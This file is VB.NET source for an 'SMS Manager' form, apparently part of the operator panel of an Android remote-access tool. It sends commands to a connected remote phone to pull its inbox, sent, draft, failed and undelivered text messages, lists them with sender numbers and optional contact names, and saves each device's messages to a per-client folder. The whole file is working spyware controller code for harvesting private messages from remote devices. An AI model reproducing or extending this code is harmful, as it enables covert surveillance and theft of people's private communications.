﻿Public Class SMS_Manager
    Dim imageList_0 As New ImageList()
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String

    Public pathSMS As String
    Sub Client_data(ByVal data As String)
        Try
            If data IsNot Nothing Then




                If data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]") Then
                    Dim spl_Exception() As String = {"[My/Exception]"}
                    Dim p() As String = data.Split(spl_Exception, StringSplitOptions.RemoveEmptyEntries)


                    Label1.Text = p(0)
                    If Panel3.Visible = False Then Panel3.Visible = True
                Else
                    DataGridView1.Rows.Clear()
                    Dim spl_LN() As String = {Form1.s.split_Line}
                    Dim ln() As String = data.Split(spl_LN, StringSplitOptions.RemoveEmptyEntries)
                    Dim Save_data As System.Text.StringBuilder = New System.Text.StringBuilder()

                    For i As Integer = 0 To ln.Length - 1
                        Dim split_Ary() As String = {Form1.s.split_Ary}
                        Dim Ary() As String = ln(i).Split(split_Ary, StringSplitOptions.RemoveEmptyEntries)
                        Dim index_image As Integer = 0
                        index_image = imageList_0.Images.IndexOfKey("sms".ToUpper)


                        If Ary.Length = 7 Then
                            DataGridView1.Rows.Add(imageList_0.Images(index_image), Ary(0), Ary(1), Ary(2), Ary(3))

                            Save_data.AppendFormat("{0}", Ary(0) + vbNewLine + Ary(1) + vbNewLine + Ary(2) + vbNewLine + Ary(4) + vbNewLine + "##---End---##" + vbNewLine)


                            DataGridView1.Rows(DataGridView1.Rows.Count - 1).Tag = Ary(4)
                            DataGridView1.Rows(DataGridView1.Rows.Count - 1).Cells(1).Tag = Ary(5) ' handle
                            pathSMS = Ary(6)
                        End If


                    Next
                    Save_data.AppendFormat("{0}", "## " + pathSMS + " ##" + vbNewLine)
                    store_0.Save_0(Name_Client & Client_ID & "\" & "SMS_Manager", Save_data.ToString)
                    If Panel3.Visible = True Then Panel3.Visible = False
                    refres_title()
                End If







            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)
        End Try
    End Sub



    Private Sub refres_title()
        Dim title As String = String.Format("SMS Manager {4}" + " - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", Client_remote_Address, Name_Client, CStr(DataGridView1.Rows.Count), CStr(DataGridView1.SelectedRows.Count), pathSMS)
        Text = title
    End Sub
    Private Sub SMS_Manager_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        ContextMenuStrip1.Renderer = New Theme_0
#Region " imageList SMS "
        Dim b As Boolean = False
        Dim List_Files As String() = IO.Directory.GetFiles(Application.StartupPath & "\" & store_0.name_folder_app_resource & "\icons\sms_manager\")
        Dim i As String
        For Each i In List_Files
            If b = False Then
                Me.icon_0.Width = Bitmap.FromFile(i).Size.Width
                imageList_0.ImageSize = New Size(Bitmap.FromFile(i).Size.Width, Bitmap.FromFile(i).Size.Height)
                imageList_0.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
                b = True
            End If
            Dim FilePath As String = i
            Dim directoryPath As String = IO.Path.GetFileNameWithoutExtension(FilePath)
            imageList_0.Images.Add(directoryPath.ToUpper, Bitmap.FromFile(i))
        Next
#End Region

        refres_title()
        Me.Icon = store_0.icons_0("window")
    End Sub
    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        refres_title()
    End Sub


    Private Sub InboxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InboxToolStripMenuItem.Click

        Form1.s.Send(handle_Number_Client, "sms_manager" + Form1.s.SplitData + "content://sms/inbox" + Form1.s.SplitData + CStr(Find_Name))


    End Sub

    Private Sub OutboxToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OutboxToolStripMenuItem.Click

        Form1.s.Send(handle_Number_Client, "sms_manager" + Form1.s.SplitData + "content://sms/outbox" + Form1.s.SplitData + CStr(Find_Name))


    End Sub

    Private Sub SentToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SentToolStripMenuItem.Click

        Form1.s.Send(handle_Number_Client, "sms_manager" + Form1.s.SplitData + "content://sms/sent" + Form1.s.SplitData + CStr(Find_Name))


    End Sub

    Private Sub FailedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FailedToolStripMenuItem.Click

        Form1.s.Send(handle_Number_Client, "sms_manager" + Form1.s.SplitData + "content://sms/failed" + Form1.s.SplitData + CStr(Find_Name))


    End Sub



    Private Sub DraftToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DraftToolStripMenuItem.Click

        Form1.s.Send(handle_Number_Client, "sms_manager" + Form1.s.SplitData + "content://sms/draft" + Form1.s.SplitData + CStr(Find_Name))


    End Sub

    Private Sub UndeliveredToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UndeliveredToolStripMenuItem.Click

        Form1.s.Send(handle_Number_Client, "sms_manager" + Form1.s.SplitData + "content://sms/undelivered" + Form1.s.SplitData + CStr(Find_Name))


    End Sub

    Private Sub All0ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles All0ToolStripMenuItem.Click

        Form1.s.Send(handle_Number_Client, "sms_manager" + Form1.s.SplitData + "content://sms/" + Form1.s.SplitData + CStr(Find_Name))

    End Sub



    Private Sub DataGridView1_CellMouseDoubleClick(ByVal sender As Object, ByVal e As System.Windows.Forms.DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseDoubleClick
        If e.RowIndex >= 0 AndAlso e.ColumnIndex >= 0 Then
            If DataGridView1.SelectedRows.Count = 1 Then
                For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                    Dim handle_SMS_0$ = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Tag   ' handle
                    Dim handle As Integer = handle_Number_Client
                    Dim A1 As editor_sms = My.Application.OpenForms("editor_sms" & handle_SMS_0)
                    If A1 Is Nothing Then
                        A1 = New editor_sms
                        A1.Client_remote_Address = Client_remote_Address
                        A1.handle_Number_Client = handle
                        A1.Name_Client = Name_Client
                        A1.sender_name = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Value
                        A1.sender_number = DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value
                        A1.Name = "editor_sms" & handle_SMS_0
                        A1.Show()
                    Else
                        If (A1.WindowState = 1) Then A1.WindowState = 0
                        If (Not A1.ContainsFocus) Then A1.Focus()
                    End If
                    A1.editor_sms_00(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Tag)
                    Dim index_image As Integer = 0
                    index_image = imageList_0.Images.IndexOfKey("smsopen".ToUpper)
                    DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(0).Value = imageList_0.Images(index_image)
                Next
            End If
        End If
    End Sub

    Private Sub DataGridView1_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellContentClick

    End Sub
    Private Find_Name As Boolean = False
    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        If ShowToolStripMenuItem.Checked = True Then
            ShowToolStripMenuItem.Checked = False
            HideToolStripMenuItem.Checked = True
            Find_Name = False
        Else
            Exit Sub
        End If
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        If HideToolStripMenuItem.Checked = True Then

            If MessageBox.Show("Show name takes some time Do you want to continue?", store_0.name_prog, MessageBoxButtons.YesNo) = Windows.Forms.DialogResult.Yes Then


                HideToolStripMenuItem.Checked = False
                ShowToolStripMenuItem.Checked = True
                Find_Name = True
            Else
                Exit Sub
            End If


        End If
    End Sub
End Class